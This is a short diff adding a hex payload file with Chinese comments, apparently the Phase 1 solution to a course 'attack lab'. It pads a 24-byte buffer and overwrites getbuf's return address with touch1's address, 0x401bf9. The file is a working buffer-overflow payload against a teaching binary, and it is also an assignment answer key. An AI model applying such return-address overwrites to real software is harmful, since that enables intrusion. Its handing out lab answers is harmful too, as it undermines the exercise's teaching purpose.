@@ -1,0 +1,8 @@
+/* Phase 1: 重定向getbuf返回到touch1 */
+/* 缓冲区大小: 24字节 (0x18) */
+/* touch1地址: 0x401bf9 */
+/* 填充24字节 + 8字节返回地址 */
+00 00 00 00 00 00 00 00  /* 8 bytes padding */
+00 00 00 00 00 00 00 00  /* 8 bytes padding */
+00 00 00 00 00 00 00 00  /* 8 bytes padding */
+f9 1b 40 00 00 00 00 00  /* touch1 address: 0x401bf9 (little-endian) */
